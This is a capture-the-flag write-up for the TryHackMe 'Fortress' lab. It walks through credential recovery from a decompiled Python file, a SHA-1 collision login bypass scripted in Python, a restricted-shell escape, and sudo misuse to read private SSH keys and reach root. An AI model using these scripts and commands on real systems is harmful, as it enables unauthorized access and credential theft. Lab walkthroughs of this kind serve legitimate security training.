<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>fortress</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>fortress</h1><br/><p><strong><h1>THM: Fortress</h1></strong></p><p></p><p><strong>Note:</strong> As suggested in the room, we need to add to /etc/hosts the following.</p><p></p><p><strong>10.10.113.98   fortress</strong></p><p><strong>10.10.113.98   temple.fortress</strong></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong>Rustscan &amp; Nmap</strong></p><p><img src="images/45-1.png" alt="images/45-1.png" /></p><p></p><p></p><p><strong>Port Analysis:</strong></p><p>22 		- 	SSH Server</p><p>5581 	-	FTP Server (With Anonymous Login allowed)</p><p>5752	-	TCP Service (Telnet for details)</p><p>7331	-	Web Server</p><p></p><p><strong>Enumerating TCP Service on 5752</strong></p><p>The TCP Service asks for credentials.</p><p><img src="images/45-2.png" alt="images/45-2.png" /></p><p></p><p><strong>FTP</strong></p><p><img src="images/45-3.png" alt="images/45-3.png" /></p><p></p><p>We got 2 files.</p><p></p><p><strong>marked.txt</strong> is related to the story and is not mandatory for the CTF</p><p><strong>.file</strong> is however an intresting file.</p><p></p><p><img src="images/45-4.png" alt="images/45-4.png" /></p><p></p><p>It is a python byte-compiled file. It can be uncompiled using <strong>uncompyle2</strong></p><p></p><p><strong>uncompyle2 .file &gt; output.py</strong></p><p></p><p><img src="images/45-5.png" alt="images/45-5.png" /></p><p></p><p>By examing the code, its clear that, its the same program that is running on the <strong>TCP port 5752</strong></p><p>We have the credentials here in <strong>Long</strong> format &amp; the program takes our input, then converts it to <strong>Long</strong> before matching for authentication.</p><p></p><p>We can use python to reverse the process. We will use the function <strong>long_to_bytes</strong> from the same module <strong>Crypto.Util.number</strong></p><p></p><p><strong>Python Code For Credential Harvesting:</strong></p><p></p><p><em>from Crypto.Util.number import long_to_bytes</em></p><p><em></em></p><p><em>username = long_to_bytes(232340432076717036154994)</em></p><p><em>print(&quot;Username: &quot; + username.decode(&quot;utf-8&quot;))</em></p><p><em></em></p><p><em>password = long_to_bytes(10555160959732308261529999676324629831532648692669445488)</em></p><p><em>print(&quot;Password: &quot; + password.decode(&quot;utf-8&quot;))</em></p><p></p><p></p><p><strong>Running the program</strong></p><p><img src="images/45-6.png" alt="images/45-6.png" /></p><p></p><p>It seems we found the credentails for TCP Program running at port 5752. Lets Login.</p><p><strong>Enumerating TCP Service on 5752</strong></p><p><img src="images/45-7.png" alt="images/45-7.png" /></p><p></p><p>Now, we found a text: “<strong>t3mple_0f_y0ur_51n5</strong>”</p><p></p><p><strong>Website Enumeration</strong></p><p><img src="images/45-8.png" alt="images/45-8.png" /></p><p></p><p>We get a default page at port 7331. I used the string found “<strong>t3mple_0f_y0ur_51n5</strong>” as directory, but is gave server error/no results.</p><p>However, if we add an <strong>extention</strong> to the string found, we found intresting results.</p><p></p><p><strong>Adding .php extentsion</strong></p><p>t3mple_0f_y0ur_51n5.php</p><p></p><p><img src="images/45-9.png" alt="images/45-9.png" /></p><p></p><p>We go to a blank page named chapter-2. However, if we view source we find <strong>commented</strong> <strong>html</strong> <strong>code</strong>.</p><p><img src="images/45-10.png" alt="images/45-10.png" /></p><p></p><p>Next,</p><p><strong>Adding .html extentsion</strong></p><p>t3mple_0f_y0ur_51n5.html</p><p></p><p><img src="images/45-11.png" alt="images/45-11.png" /></p><p></p><p>We land in a login page. However, if we view source we find <strong>commented</strong> <strong>php</strong> <strong>code</strong>.</p><p><img src="images/45-12.png" alt="images/45-12.png" /></p><p></p><p></p><p>Examining the above I conclude that the <strong>PHP Code</strong> is used for authentication purpose and <strong>HTML code</strong> is used as a Login page using <strong>GET Request</strong>.</p><p></p><p><strong><h2>Foothold</h2></strong></p><p><strong>SHA-1 Collision</strong></p><p></p><p></p><p>What it’s doing is that , taking two GET parameters <strong>user</strong> and <strong>pass</strong> doing a type check also checking it&#39;s<strong> SHA-1 hash</strong> if they are <strong>similar</strong> which is what we call <strong>hash collision</strong> and back in 2017 someone discovered a <strong>collision in SHA-1</strong> by calculating the hash of two pdf files.</p><p></p><p><img src="images/45-13.png" alt="images/45-13.png" /></p><p></p><p>Link to get the pdf files: <strong>https://shattered.it/</strong></p><p></p><p>Note: Since we will be using PDF files as input to a web page login form, we need to make the web request in python as we cannot do the same in a browser.</p><p></p><p><strong>Python Code for Web Request:</strong></p><p><em>import requests</em></p><p><em></em></p><p><em># Fetching 2 pdf&#39;s file which cause SHA-1 collision</em></p><p><em></em></p><p><em>pdf1 = requests.get(&quot;https://shattered.it/static/shattered-1.pdf&quot;)</em></p><p><em>pdf2 = requests.get(&quot;https://shattered.it/static/shattered-2.pdf&quot;)</em></p><p><em></em></p><p><em># Assinging pdf&#39;s content into the GET parameters</em></p><p><em></em></p><p><em>params = {&#39;user&#39;: pdf1.content, &#39;pass&#39;: pdf2.content}</em></p><p><em>r = requests.get(&quot;http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/&quot;,params=params)</em></p><p><em>print(r.text)</em></p><p></p><p></p><p><strong>We run it</strong></p><p><img src="images/45-14.png" alt="images/45-14.png" /></p><p></p><p>As we are using GET, the entire PDF is sent in URL which exceeds the Limit of <strong>8KB</strong></p><p><strong>Note:</strong> Maximum capacity of <strong>url request </strong>is <strong>8 KB</strong> while we exceed this limit as combined size of those files is <strong>825 KB</strong></p><p></p><p>Upon Further research, I found that a <strong>certain part</strong> of both the <strong>PDFs</strong> cause this <strong>collision</strong>. This turns out to be the <strong>first 192 octets</strong>. I will test the same by cutting the PDF with <strong>xxd</strong> and matching the fragments as below. </p><p></p><p><strong>Note:</strong> We will download the files and make the operations then host locally.</p><p><img src="images/45-15.png" alt="images/45-15.png" /></p><p></p><p>Just to verify, we can confirm that the default PDFs without any modifications indeed have SHA-1 Collision as we can see the SHA-1 output for both is same. Now, lets truncate it.</p><p></p><p><strong>xxd -l 192 shattered-1.pdf &gt; 1-pdf.192</strong></p><p><strong>xxd -l 192 shattered-2.pdf &gt; 2-pdf.192</strong></p><p></p><p><strong>-l len | -len len</strong></p><p><strong>      Stop after writing len octets.</strong></p><p></p><p>Testing if still the collision occurs.</p><p><img src="images/45-16.png" alt="images/45-16.png" /></p><p></p><p>Indeed, the SHA-1 Collision occurs, Now we can send it to the webserver as the size is reduced.</p><p></p><p>We change the python requester.</p><p><em>import requests</em></p><p><em></em></p><p><em># Fetching 2 pdf&#39;s file which cause SHA-1 collision</em></p><p><em></em></p><p><em>pdf1 = requests.get(&quot;https://localhost/1-pdf.192&quot;)</em></p><p><em>pdf2 = requests.get(&quot;https://localhost/2-pdf.192&quot;)</em></p><p><em></em></p><p><em># Assinging pdf&#39;s content into the GET parameters</em></p><p><em></em></p><p><em>params = {&#39;user&#39;: pdf1.content, &#39;pass&#39;: pdf2.content}</em></p><p><em>r = requests.get(&quot;http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/&quot;,params=params)</em></p><p><em>print(r.text)</em></p><p></p><p><strong>Running</strong></p><p><img src="images/45-17.png" alt="images/45-17.png" /></p><p></p><p>We again got an error stating the username and password cannot be same. We need to expand the PDFs more.</p><p>This is the <strong>first</strong> <strong>error</strong> of the <strong>Commented PHP Code</strong></p><p></p><p>Lets change the PDF files to include more bytes so that they are actually different, so that we will evade the first check.</p><p></p><p><strong>xxd -l 320 shattered-1.pdf | xxd -r &gt; 1-pdf.320</strong></p><p><strong>xxd -l 320 shattered-2.pdf | xxd -r &gt; 2-pdf.320</strong></p><p></p><p><strong>-r | -revert</strong></p><p><strong>      Reverse operation: convert (or patch) hexdump into  binary. If not  writing</strong></p><p><strong>      to stdout, xxd writes into its output file without truncating it.</strong></p><p><strong>      Use the combination -r -p to read plain hexadecimal dumps without line number</strong></p><p><strong>      information and without a particular column layout.</strong></p><p><strong>      Additional Whitespace and line-breaks are allowed anywhere.</strong></p><p></p><p><strong>Note:</strong> We pipe the data after converting to binary into our new input files. (Else it shows Invalid Password: Without <strong>xxd -r</strong>)</p><p></p><p><strong>Change in Python Web Request Code:</strong></p><p><em>import requests</em></p><p><em></em></p><p><em># Fetching 2 pdf&#39;s file which cause SHA-1 collision</em></p><p><em></em></p><p><em>pdf1 = requests.get(&quot;http://localhost/1-pdf.320&quot;)</em></p><p><em>pdf2 = requests.get(&quot;http://localhost/2-pdf.320&quot;)</em></p><p><em></em></p><p><em># Assinging pdf&#39;s content into the GET parameters</em></p><p><em></em></p><p><em>params = {&#39;user&#39;: pdf1.content, &#39;pass&#39;: pdf2.content}</em></p><p><em>r = requests.get(&quot;http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/&quot;,params=params)</em></p><p><em>print(r.text)</em></p><p></p><p><strong>Running</strong></p><p><img src="images/45-18.png" alt="images/45-18.png" /></p><p></p><p>Now, we got the <strong>second</strong> <strong>error</strong> of the <strong>Commented PHP Code</strong>.</p><p>Its due to the username &amp; password length. According to the <strong>Commented PHP Code</strong>, our <strong>username</strong> should be <strong>&gt;= 500 charecters</strong> and <strong>password</strong> should be <strong>&gt;= 600  charecters</strong>.</p><p></p><p>We modify our PDF inputs.</p><p></p><p><strong>xxd -l 700 shattered-1.pdf | xxd -r &gt; 1-pdf.700</strong></p><p><strong>xxd -l 700 shattered-2.pdf | xxd -r &gt; 2-pdf.700</strong></p><p></p><p>We change the python code accordingly to use the above files as input.</p><p></p><p><strong>Running</strong></p><p><img src="images/45-19.png" alt="images/45-19.png" /></p><p></p><p>Now, we got the <strong>third</strong> <strong>error</strong> of the <strong>Commented PHP Code</strong>.</p><p>Its regarding badchars in the PDF.</p><p></p><p>Finally, I searched for SHA-1 Collision online and found another set of files which solve the above issues.</p><p><strong>https://sha-mbles.github.io/</strong></p><p>From here I downloaded <strong>messageA</strong> and <strong>messageB</strong></p><p></p><p>Analyze the files for <strong>length</strong> and <strong>SHA-1 collision</strong>.</p><p><img src="images/45-20.png" alt="images/45-20.png" /></p><p></p><p>As we can see, the size satisfies our conditions of<strong> &gt;=500 &amp; &gt;=600</strong> respectively and the files indeed have <strong>SHA-1 Collision.</strong></p><p></p><p><strong>Final Python Code:</strong></p><p>import requests</p><p></p><p># Fetching 2 pdf&#39;s file which cause SHA-1 collision</p><p></p><p>pdf1 = requests.get(&quot;http://localhost/messageA&quot;)</p><p>pdf2 = requests.get(&quot;http://localhost/messageB&quot;)</p><p></p><p># Assinging pdf&#39;s content into the GET parameters</p><p></p><p>params = {&#39;user&#39;: pdf1.content, &#39;pass&#39;: pdf2.content}</p><p>r = requests.get(&quot;http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/&quot;,params=params)</p><p>print(r.text)</p><p></p><p><strong>Running</strong></p><p><img src="images/45-21.png" alt="images/45-21.png" /></p><p></p><p>Finally, we are able to login and get the string “<strong>m0td_f0r_j4x0n.txt</strong>”</p><p></p><p>We use the link with our URL: <strong>http://fortress:7331/m0td_f0r_j4x0n.txt</strong></p><p><img src="images/45-22.png" alt="images/45-22.png" /></p><p></p><p></p><p>We found the Private Key for the User: <strong>h4rdy</strong></p><p>Lets try to Login with <strong>SSH</strong></p><p></p><p>Copy the private key to a file <strong>id_h4rdy</strong> &amp; change its permission to <strong>chmod 600 id_h4rdy</strong></p><p>Then Logon to SSH using <strong>ssh -i id_h4rdy h4rdy@fortress</strong></p><p></p><p><img src="images/45-23.png" alt="images/45-23.png" /></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>We successfully logged on the machine, however I find that we are unable to run any command. Later checking i found we are runnning <strong>restricted bash</strong>.</p><p></p><p><img src="images/45-24.png" alt="images/45-24.png" /></p><p></p><p>We confirm that we are running <strong>rbash</strong> &amp; the <strong>PATH</strong> &amp; <strong>SHELL</strong> variables are <strong>READ ONLY</strong></p><p></p><p><strong>Solution</strong></p><p>Log out of SSH and Login again using a <strong>pseudo terminal option</strong> in <strong>SSH</strong> Login.</p><p>Using <strong>-t</strong> which enables &quot;<strong>pseudo-tty allocation</strong>&quot;</p><p></p><p>Format: </p><p></p><p><strong>ssh -i id_h4rdy h4rdy@fortress -t bash &#39;--noprofile&#39;</strong></p><p><img src="images/45-25.png" alt="images/45-25.png" /></p><p></p><p>With the Pseudo Terminal, we are able to change the <strong>SHELL</strong> &amp; <strong>PATH</strong> variables. We set them as above. Now we have a fully functional terminal.</p><p></p><p><strong>Lateral Movement</strong></p><p><img src="images/45-26.png" alt="images/45-26.png" /></p><p></p><p>I checked for Sudo access for <strong>h4rdy</strong>. He was allowed to run <strong>/bin/cat</strong> as user <strong>j4x0n</strong> without any password. Thus I used the follwing command to read his private ssh key. </p><p></p><p><strong>sudo -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa</strong></p><p></p><p>I reapeat the same steps on my Local Kali machine to Login as user <strong>j4x0n</strong></p><p>Copy the private key to a file <strong>id_j4x0n</strong> &amp; change its permission to <strong>chmod 600 id_j4x0n</strong></p><p>Then Logon to SSH using <strong>ssh -i id_j4x0n j4x0n@fortress</strong></p><p></p><p><img src="images/45-27.png" alt="images/45-27.png" /></p><p></p><p>I successfully, logged in as user <strong>j4x0n</strong>. I notice that the user is member of group <strong>adm</strong></p><p>This group has read access to <strong>auth logs</strong>. So I enumerate it.</p><p></p><p></p><p><strong>ls -l /var/log/auth.log</strong></p><p><img src="images/45-28.png" alt="images/45-28.png" /></p><p></p><p>I will view the file with <strong>more</strong> &amp; search for Login credentials.</p><p></p><p><strong>I found veekay&#39;s password</strong></p><p><img src="images/45-29.png" alt="images/45-29.png" /></p><p></p><p><strong>I found h4rdy&#39;s password</strong></p><p><img src="images/45-30.png" alt="images/45-30.png" /></p><p></p><p>Finally</p><p><strong>I found j4x0n&#39;s password</strong></p><p><img src="images/45-31.png" alt="images/45-31.png" /></p><p></p><p>Lets check sudo for <strong>j4x0n</strong>. It needed password. Once I provided password, as we can see <strong>j4x0n</strong> has sudo access for all commands.So i run a <strong>sudo</strong> <strong>bash</strong> to become <strong>root</strong>.</p><p></p><p><img src="images/45-32.png" alt="images/45-32.png" /></p><p></p><p>Thanks!!</p></div>
</body>
</html>
